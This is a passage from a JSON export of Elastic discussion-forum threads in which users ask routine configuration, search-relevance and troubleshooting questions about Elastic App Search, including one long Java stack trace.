    "body": "Although AppSearch matches email-addresses quite well, it is too eager at returning documents where only the domain matches. For instance, when searching for helpme@gmail.com, it might also return thousands of documents with \"gmail\" in the address. Perhaps creating an additional field with only the first part of the address would help, but the domain is still important for the search nonetheless. Also, adding more fields has performance impact. What would be a good and efficient way of searching for email-addresses?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "894cf537-ef43-4273-a2ba-cbad93796bfb",
    "url": "https://discuss.elastic.co/t/can-you-hook-an-existing-elasticsearch-index-to-elastic-app-search/222508",
    "title": "Can you hook an existing Elasticsearch index to Elastic App search",
    "category": [
      "App Search"
    ],
    "author": "SanshilaG",
    "date": "March 6, 2020, 8:00pm March 7, 2020, 1:41pm March 9, 2020, 2:49pm March 9, 2020, 3:46pm April 6, 2020, 3:46pm",
    "body": "I want to integrate App Search in my project. App search runs fine out of the box. But I have an application that is running on Elasticsearch, I was wondering if I could use this existing index as a backend for App search? If No, is it because documents are indexed differently for App Search engine compared to Elasticsearch? Also, why can't I access App search documents from my elasticsearch cluster (localhost:9200)?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e29b8a22-ec4b-4e33-ba97-af76d75b441a",
    "url": "https://discuss.elastic.co/t/partial-search-on-particular-field/222659",
    "title": "Partial search on particular field",
    "category": [
      "App Search"
    ],
    "author": "alexp0205",
    "date": "March 9, 2020, 9:35am March 9, 2020, 11:01am March 9, 2020, 11:05am March 9, 2020, 12:44pm April 6, 2020, 12:01pm",
    "body": "I have an appsearch engines with the following documents [{ \"id\": 1, \"category\": [\"television\"], \"name\": \"ABC Television\" }, { \"id\": 2, \"category\": [\"fridge\"], \"name\": \"Tele Fridge\" }] How can I do partial search on particular fields. Like in this example, say I want to search for all documents where category matches \"fridg\" and name matches \"tele\" such that it returns document with id:2, how can I do that?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "792632da-bb2d-49bf-8ff6-232a7a361ec5",
    "url": "https://discuss.elastic.co/t/app-search-for-arabic-content/222584",
    "title": "App Search for Arabic content",
    "category": [
      "App Search"
    ],
    "author": "aljulanda",
    "date": "March 8, 2020, 6:01am April 5, 2020, 6:05am",
    "body": "Hi, I see that App Search has language optimization for 13 languages (here) which don't include Arabic. The content on our app is mainly in Arabic and we're looking into using App Search. Would App Search still work well with Arabic content even though it's not on the list of available language optimizers? Thanks,",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2a1e9ceb-a293-4832-93b7-a9dcf69a471c",
    "url": "https://discuss.elastic.co/t/self-hosted-app-search-net-core-ui/216633",
    "title": "Self hosted app search .Net Core UI",
    "category": [
      "App Search"
    ],
    "author": "Srini12",
    "date": "January 27, 2020, 10:34am January 27, 2020, 11:51am January 28, 2020, 6:53am February 4, 2020, 2:21pm February 5, 2020, 2:53pm February 6, 2020, 8:08am February 6, 2020, 11:53am February 6, 2020, 11:57am March 4, 2020, 11:55am March 4, 2020, 12:08pm March 4, 2020, 12:09pm March 4, 2020, 12:20pm March 4, 2020, 3:59pm March 5, 2020, 7:14am March 5, 2020, 12:00pm April 2, 2020, 12:00pm",
    "body": "Good Day, We are planning to use app search self managed service to integrate into .Net Core MVC UI. I am able to set up app search self managed instance on Linux machine. Is there any sample Appsearch client UI in .net. There is no client available on https://swiftype.com/documentation/app-search/getting-started clients.. Any guidence is much appreciated. Thanks and Kind Regards Srini",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "2048a9e5-49d5-4180-aafc-a29c15297891",
    "url": "https://discuss.elastic.co/t/installing-self-hosted-with-systemd-configuration/221479",
    "title": "Installing self hosted with systemd configuration",
    "category": [
      "App Search"
    ],
    "author": "bpamiri",
    "date": "February 28, 2020, 7:10pm March 2, 2020, 4:11pm March 2, 2020, 1:46pm March 3, 2020, 12:13pm March 31, 2020, 12:12pm",
    "body": "I think the docs need to be updated. The current docs only specify how to create the app-search systemd service. There is no mentions of other child services that may need to be created or started. I just followed the instructions to build a 7.6 box and if I start app-search via the service the GUI doesn't start. But if I start it via /usr/share/app-search/bin/app-search then everything starts up and the GUI runs as well. I installed app-search by downloading the RPM and doing yum install /path/to/downloaded/rpm",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f3ecdcc8-cda4-48e0-8b12-71009436a0a7",
    "url": "https://discuss.elastic.co/t/multi-level-grouping/221866",
    "title": "Multi Level Grouping",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "March 3, 2020, 11:18am March 3, 2020, 11:35am March 31, 2020, 11:35am",
    "body": "Hi is it possible to get multi-level grouping information. As right now we are able to group based on one field but instead group on multiple fields simultaneously. \"group_key1\":{ \"sub_group_key1\":{ }, \"sub_group_key2\":{ } }, \"group_key2\":{ \"sub_group_key1\":{ }, \"sub_group_key2\":{ } }. Also currently if you group across a field you get at max 10 results per group (1 most matched and 9 under _group key) Is it possible to get all the results of a particular group",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0bc68ef4-3eea-4d13-9bcb-440e2cf7bfbc",
    "url": "https://discuss.elastic.co/t/default-query/221536",
    "title": "Default Query",
    "category": [
      "App Search"
    ],
    "author": "DickyKwok",
    "date": "February 29, 2020, 9:06pm February 29, 2020, 9:07pm March 2, 2020, 11:32am March 30, 2020, 11:32am",
    "body": "Hi all, I am a Hong Kong developer who are making a online shopping platform and if I want to set some default result, how can I get it done by using search ui, does it support it? I know we can set \"AND\" \"OR\" query, but if I want to set a sample results of products,for example, to show many products in customers' wishlist. I need to set multi query but does it support in search ui? Here is my config now but the query would be too long let config = { alwaysSearchOnInitialLoad: true, searchQuery: { query: \"doc-5e3a9bb6a1f322f8d040573c OR doc-5e3a9bb4a1f3222dbe40547e OR doc-5e3a9bb2a1f322bd364052bf OR doc-5e3a9bb4a1f3222dbe405453 OR doc-5e3a9bb7a1f3225fa14057ef\", }, apiConnector: connector // initialState: { // searchTerm: // \"doc-5e3a9bb6a1f322f8d040573c OR doc-5e3a9bb4a1f3222dbe40547e OR doc-5e3a9bb2a1f322bd364052bf OR doc-5e3a9bb4a1f3222dbe405453 OR doc-5e3a9bb7a1f3225fa14057ef\" // }, };",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "12a59100-86bc-40d0-a9d0-561e90b40666",
    "url": "https://discuss.elastic.co/t/java-lang-outofmemoryerror-unable-to-create-native-thread/221619",
    "title": "java.lang.OutOfMemoryError: unable to create native thread",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "March 2, 2020, 5:32am March 30, 2020, 5:31am",
    "body": "My app-search self-hosted console is throwing following error on the login page. I've no clue what exactly is going wrong (and what's the root cause of it). Yes, it does indicate that it could be out of memory OR running out of threads; but I've limited ES to use 4g of memory (out of 16 gb available). Can someone help me fix this? I'm using ES and App Search Ver. 7.6 (latest). java.lang.OutOfMemoryError: unable to create native thread: possibly out of memory or process/resource limits reached at java.base/java.lang.Thread.start0(Native Method) at java.base/java.lang.Thread.start(Thread.java:803) at java.base/java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:937) at java.base/java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1352) at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118) at org.jruby.compiler.JITCompiler.buildThresholdReached(JITCompiler.java:219) at org.jruby.internal.runtime.AbstractIRMethod.tryJit(AbstractIRMethod.java:62) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:101) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:192) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:141) at org.jruby.ir.interpreter.InterpreterEngine.processCall(InterpreterEngine.java:345) at org.jruby.ir.interpreter.StartupInterpreterEngine.interpret(StartupInterpreterEngine.java:72) at org.jruby.ir.interpreter.InterpreterEngine.interpret(InterpreterEngine.java:86) at org.jruby.internal.runtime.methods.MixedModeIRMethod.INTERPRET_METHOD(MixedModeIRMethod.java:156) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:143) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:172) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.actionpack_minus_4_dot_2_dot_11_dot_1.lib.action_dispatch.middleware.static.invokeOther15:match?(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/actionpack-4.2.11.1/lib/action_dispatch/middleware/static.rb:114) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.actionpack_minus_4_dot_2_dot_11_dot_1.lib.action_dispatch.middleware.static.RUBY$method$call$0(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/actionpack-4.2.11.1/lib/action_dispatch/middleware/static.rb:114) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:110) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:140) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:172) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.rack_minus_1_dot_6_dot_11.lib.rack.sendfile.invokeOther7:call(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/rack-1.6.11/lib/rack/sendfile.rb:113) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.rack_minus_1_dot_6_dot_11.lib.rack.sendfile.RUBY$method$call$0(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/rack-1.6.11/lib/rack/sendfile.rb:113) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:110) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:140) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:172) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.app.middleware.stats_middleware_dot_class.invokeOther3:call(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/app/middleware/stats_middleware.class:10) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.app.middleware.stats_middleware_dot_class.RUBY$method$call$0(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/app/middleware/stats_middleware.class:10) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:110) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:140) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:172) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.shared_togo.lib.shared_togo.external_host_middleware_dot_class.invokeOther3:call(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/shared_togo/lib/shared_togo/external_host_middleware.class:15) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.shared_togo.lib.shared_togo.external_host_middleware_dot_class.RUBY$method$call$0(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/shared_togo/lib/shared_togo/external_host_middleware.class:15) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:110) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:140) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:172) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.railties_minus_4_dot_2_dot_11_dot_1.lib.rails.engine.invokeOther9:call(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/railties-4.2.11.1/lib/rails/engine.rb:518) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.railties_minus_4_dot_2_dot_11_dot_1.lib.rails.engine.RUBY$method$call$0(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/railties-4.2.11.1/lib/rails/engine.rb:518) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.railties_minus_4_dot_2_dot_11_dot_1.lib.rails.engine.RUBY$method$call$0$__VARARGS__(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/railties-4.2.11.1/lib/rails/engine.rb) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:84) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:70) at org.jruby.ir.runtime.IRRuntimeHelpers.instanceSuper(IRRuntimeHelpers.java:1169) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.railties_minus_4_dot_2_dot_11_dot_1.lib.rails.application.invokeSuper4:call(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/railties-4.2.11.1/lib/rails/application.rb:165) at tmp.jetty_minus_142_dot_93_dot_219_dot_255_minus_3002_minus_app_minus_search_dot_war_minus___minus_any_minus_985191846023762874_dot_dir.webapp.WEB_minus_INF.gems.gems.railties_minus_4_dot_2_dot_11_dot_1.lib.rails.application.RUBY$method$call$0(/tmp/jetty-142.93.219.255-3002-app-search.war-_-any-985191846023762874.dir/webapp/WEB-INF/gems/gems/railties-4.2.11.1/lib/rails/application.rb:165) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:110) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:140) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:172) at uri_3a_classloader_3a_.rack.handler.servlet.invokeOther4:call(uri:classloader:/rack/handler/servlet.rb:22) at uri_3a_classloader_3a_.rack.handler.servlet.RUBY$method$call$0(uri:classloader:/rack/handler/servlet.rb:22) at org.jruby.internal.runtime.methods.CompiledIRMethod.call(CompiledIRMethod.java:110) at org.jruby.internal.runtime.methods.MixedModeIRMethod.call(MixedModeIRMethod.java:140) at org.jruby.internal.runtime.methods.DynamicMethod.call(DynamicMethod.java:200) at org.jruby.RubyClass.finvoke(RubyClass.java:798) at org.jruby.runtime.Helpers.invoke(Helpers.java:450) at org.jruby.RubyBasicObject.callMethod(RubyBasicObject.java:364) at org.jruby.javasupport.JavaEmbedUtils$1.callMethod(JavaEmbedUtils.java:117) at org.jruby.rack.DefaultRackApplication.call(DefaultRackApplication.java:64) at org.jruby.rack.AbstractRackDispatcher.process(AbstractRackDispatcher.java:33) at org.jruby.rack.AbstractFilter.doFilter(AbstractFilter.java:66) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652) at org.eclipse.jetty.servlets.QoSFilter.doFilter(QoSFilter.java:200) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141) at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:215) at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:110) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) at org.eclipse.jetty.server.handler.StatisticsHandler.handle(StatisticsHandler.java:159) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) at org.eclipse.jetty.server.Server.handle(Server.java:497) at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) at java.base/java.lang.Thread.run(Thread.java:834)",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5f0e0b06-4987-4496-b4c7-a232ffdb0323",
    "url": "https://discuss.elastic.co/t/error-400-filters-contains-an-invalid-set-of-keys-for-object-inside-of-field-filters-root-can-only-have-clauses-or-a-single-field-name/221124",
    "title": "Error: [400] Filters contains an invalid set of keys for object inside of field: filters root; can only have clauses or a single field name",
    "category": [
      "App Search"
    ],
    "author": "Hayden-NTW",
    "date": "February 27, 2020, 1:05am February 27, 2020, 6:18pm March 26, 2020, 6:36pm",
    "body": "I'm trying to get filtered result from elastic/app-search. Below is facets data from first search. <h3>Brand</h3> <input type=\"checkbox\" name=\"brand1\" value=\"brand1\"> <input type=\"checkbox\" name=\"brand2\" value=\"brand2\"> <h3>Price</h3> <input type=\"checkbox\" name=\"price1\" value=\"price1\"> <input type=\"checkbox\" name=\"price2\" value=\"price2\"> When user click any checkbox, the value is contained to product_options's filter. It's working if filter has one condition like this: product_options { result_fields: {...}, facets: {...}, page: {...}, sort: {...}, filteres: { brand: [\"brand1\"] } } And it still working when there's 2 or more brands. like this: product_options { result_fields: {...}, facets: {...}, page: {...}, sort: {...}, filteres: { brand: [\"brand1\", \"brand2\"...] } } but, when the filters object has 2 or more conditions in its root, the error occurred like this: Error: [400] Filters contains an invalid set of keys for object inside of field: filters root; can only have clauses or a single field name If I want to use multi condition like below: filters: { brand: [\"brand1\"], price: [\"price1\"] } What should I do? Thank you for reading and helping!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6c0f0b9c-5214-4d87-af4a-c0605cb2c2cf",
    "url": "https://discuss.elastic.co/t/app-search-app-logs-loco-togo-production-too-large-in-size-55-gb-how-to-fix/219761",
    "title": "App search app logs loco togo production - Too Large In Size (~55 Gb!) - How to fix?",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "February 18, 2020, 10:40am February 21, 2020, 5:03am February 27, 2020, 3:01am February 27, 2020, 12:09pm February 27, 2020, 4:07pm March 26, 2020, 4:07pm",
    "body": "Is there any way to manage app-search analytics indices automatically? They are growing too large in size. For example, This index .app-search-app-logs-loco_togo_production-7.1.0-2020.02.14 is currently at 54 Gb! My SSDs are running out of space because of this. I'm currently on app-search and ES 7.6.0 (latest). Can someone offer a fix for this?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "dc3dec14-0bba-4cb5-ac03-f723da1a43c7",
    "url": "https://discuss.elastic.co/t/document-size-limit-change/220197",
    "title": "Document Size limit change",
    "category": [
      "App Search"
    ],
    "author": "rafatz",
    "date": "February 20, 2020, 1:36pm February 21, 2020, 3:55pm March 20, 2020, 3:55pm",
    "body": "Hello, currently the only thing that is holding the implementation of appsearch is the document size limit. Do you have any plans to allow self-hosted users to modify this limit? Thanks! -- BR, Rafael $ cd /pub $ more beer",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bab7577a-28bb-490c-b4d9-b2c4be04e27a",
    "url": "https://discuss.elastic.co/t/unable-to-login-to-app-search-dashboard-self-hosted-after-upgrading-to-7-6-0/219586",
    "title": "Unable to login to app-search dashboard (self-hosted) after upgrading to 7.6.0",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "February 17, 2020, 9:22am February 19, 2020, 4:44pm February 21, 2020, 11:46am February 21, 2020, 11:47am March 20, 2020, 5:02am",
    "body": "I recently upgraded to ES and App-Search 7.6.0. During install I chose to use the maintainers version for config files. Turns out that while everything else seems to be working fine, I'm unable to login to the app-search dashboard. I had not customized the login and password; and went with the system generated. I referred to the documentation and ran ./app-search --reset-auth command. It did reset the password, but the new password doesn't work either. Am I missing out on anything? PS: I'd also like to know what's the right way to remove everything (app_search and ES) and perform a clean install from scratch. Is there any documentation that shows how to clean uninstall app-search?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "a04b4714-64a6-4e0b-9598-92c33c6ec20b",
    "url": "https://discuss.elastic.co/t/options-for-increasing-precision/219920",
    "title": "Options for increasing precision",
    "category": [
      "App Search"
    ],
    "author": "rathcke",
    "date": "February 19, 2020, 8:27am February 19, 2020, 1:07pm February 20, 2020, 9:40am March 19, 2020, 9:40am",
    "body": "I think this question has been asked a few times in various ways. As I understand, AppSearch aims to have a high recall. We have a use-case where we'd like to increase precision. One way to do that is by adjusting the fuzziness, but this does not seem to be doable. Is this something that is on the roadmap? The solution about filtering results on a set score threshold does not seem to work either. Sometimes a query will return results with high scores (20-30) and results that are not relevant will still have a score on ~5. Other times, the most relevant result has a score of 1, so setting a \"hard\" threshold does not seem to work. Are there any other options? Hopefully you can help",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "790f7479-53ba-48af-ad6a-ce608a7d6919",
    "url": "https://discuss.elastic.co/t/extraction-of-text-to-index/219548",
    "title": "Extraction of text to index",
    "category": [
      "App Search"
    ],
    "author": "Zane_D",
    "date": "February 17, 2020, 12:13am February 19, 2020, 1:17pm February 19, 2020, 2:40pm March 18, 2020, 2:40pm",
    "body": "Another question, do you have a module(s) that support the extraction of text from PDFs, office documents, jpg that feeds into app search? Not from a URL like your site product, but just through API?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6215cfda-ffed-4424-909f-cb1f15f81b10",
    "url": "https://discuss.elastic.co/t/relevance-score-threshold/219765",
    "title": "Relevance Score Threshold",
    "category": [
      "App Search"
    ],
    "author": "uklft",
    "date": "February 18, 2020, 10:44am February 19, 2020, 1:15pm March 18, 2020, 1:15pm",
    "body": "Hey there, is there a way to apply a threshold to the relevance score? We'd like to exclude results with a score lower than a defined value. Also, it would be nice to see the score value per field in the query preview to analyze how fields affect the overall score. Are these features that may make it to the roadmap? Kind regards, Fabian",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "48f5509d-1297-487b-8f49-5246aa339d6e",
    "url": "https://discuss.elastic.co/t/is-there-any-way-to-get-client-search-and-client-querysuggestion-data-at-once/219695",
    "title": "Is there any way to get client.search and client.querySuggestion' data at once?",
    "category": [
      "App Search"
    ],
    "author": "Hayden-NTW",
    "date": "February 18, 2020, 2:35am February 18, 2020, 6:48pm March 17, 2020, 6:48pm",
    "body": "I'm so new for elastic/app-searce. I'm using @elastic/app-search-javascript@7.6.0. I need client.search results and client.querySuggestion's result at once, so I wrote code like this. client.querySuggestion(keyword, option) .then(resultList => { target.innerHTML = '' let results = resultList.results.documents target.append(...) client.search(keyword, options) .then(resultList => { resultList.results.forEach(result => { target.append(...) }) }) }) As you just read, I queried twice(querySuggestion and search) and I think it'll be slow. Is there any function or way to get both results at once? Thanks for reading, thanks for helping me!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "316d91a0-ad9e-46cf-b829-c42838e9c07f",
    "url": "https://discuss.elastic.co/t/multi-tenant-app-search/219544",
    "title": "Multi-tenant app search",
    "category": [
      "App Search"
    ],
    "author": "Zane_D",
    "date": "February 16, 2020, 10:39pm March 15, 2020, 10:39pm",
    "body": "We're investigating Elastic and App search in an AWS environment. Our app is multi-tenant, so I'll need to create an engine/index per customer on the fly, with \"guaranteed\" segregation. Every customer will have the same setup (engine), with users that will only be able to see the documents they have privileges to. Probably a basic question at this point, but I'm new to Elastic. Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "37040116-c091-43f1-be5c-b845f777cb71",
    "url": "https://discuss.elastic.co/t/results-per-page-limit/217643",
    "title": "Results per Page limit",
    "category": [
      "App Search"
    ],
    "author": "uklft",
    "date": "February 3, 2020, 3:08pm February 3, 2020, 4:13pm February 4, 2020, 8:48am February 4, 2020, 12:45pm February 4, 2020, 12:56pm February 14, 2020, 9:13am March 13, 2020, 9:13am",
    "body": "Hey there, When i try to list documents with a page size of 1000, the server always returns only 100 documents. Tested with curl and python client: curl -s -X GET 'http://server/api/as/v1/engines/gap/documents/list' \\ -H 'Content-Type: application/json' \\ -H 'Authorization: Bearer private-XXX' \\ -d \"{\\\"page\\\": {\\\"current\\\": 1,\\\"size\\\": 1000}}\" or data = self.client.list_documents(self.engine, current=page, size=1000) Am i doing something wrong or may this be a bug? Kind regards, Fabian",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "9d024406-eb11-4b13-81fa-90c1849b9e6c",
    "url": "https://discuss.elastic.co/t/field-character-restriction/217645",
    "title": "Field character restriction",
    "category": [
      "App Search"
    ],
    "author": "uklft",
    "date": "February 3, 2020, 3:16pm February 4, 2020, 1:01pm February 14, 2020, 9:12am March 13, 2020, 9:12am",
    "body": "Hey again, Although the server explicitely forbids this, we would really like to use german umlauts in our field names. Is there any chance that this is possible in the future? Kind regards, Fabian",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "40e7a16e-b7aa-4451-90f3-0ed54c9b3492",
    "url": "https://discuss.elastic.co/t/appsearch-synonyms-management/218732",
    "title": "AppSearch Synonyms management",
    "category": [
      "App Search"
    ],
    "author": "seblg",
    "date": "February 11, 2020, 8:54am February 13, 2020, 12:10pm March 12, 2020, 12:10pm",
    "body": "Hi We're working with AppSearch solution and need to manage a large list of synonyms, which is regularly updated. We have simple scripts to put all synonyms to an engine, and to delete all of them. Is there an impact on analytics when proceeding this way ? Should we aim to manage each synonym set individually by id ? Also what are the best practices regarding synonym management ? Regards, Sébastien",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "68a9b13f-3d2e-492b-9b71-cd91bb2cabaf",
    "url": "https://discuss.elastic.co/t/rename-engine-via-api-endpoint/219128",
    "title": "Rename Engine via API endpoint",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "February 13, 2020, 6:54am February 13, 2020, 7:38am March 12, 2020, 7:38am",
    "body": "Hi is it possible to rename an engine via a REST request",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "30bfaf36-7f52-4cd1-8a94-fb6c5052bedb",
    "url": "https://discuss.elastic.co/t/redirect-to-welcome-gives-404-error/218692",
    "title": "Redirect to /welcome gives 404 error",
    "category": [
      "App Search"
    ],
    "author": "elliottecton",
    "date": "February 11, 2020, 12:28am February 12, 2020, 11:45pm March 11, 2020, 11:45pm",
    "body": "I have modified app-search.yaml to reflect the following: ------------------------------- Hosting & Network --------------------------- app_search.external_url: http://10.216.29.52 app_search.listen_host: 10.216.29.52 app_search.listen_port: 3002 It starts up the service on http://10.216.29.52, but going there, I am redirected to /welcome, which the returns a 404 NOT FOUND error. Any idea where I misconfigured this?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "785d99f9-477c-44fb-b691-ed4975f7b487",
    "url": "https://discuss.elastic.co/t/whats-the-difference-between-elastic-app-search-and-elastic-site-search/218227",
    "title": "What's the difference between Elastic App Search and Elastic Site Search",
    "category": [
      "App Search"
    ],
    "author": "DickyKwok",
    "date": "February 6, 2020, 5:08pm February 6, 2020, 8:09pm February 6, 2020, 10:13pm March 5, 2020, 10:13pm",
    "body": "Hello guys, may I ask a silly question, what's the difference between Elastic App Search and Elastic Site Search? When I create an instance in elastic cloud, I could only use the service of elasticsearch and elastic app search. But as the official website said, there's a service called elastic site search. I am so confused with that...",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c98a3e27-761f-4108-9b5a-dd6944dcc2c8",
    "url": "https://discuss.elastic.co/t/formatting-response/218146",
    "title": "Formatting response",
    "category": [
      "App Search"
    ],
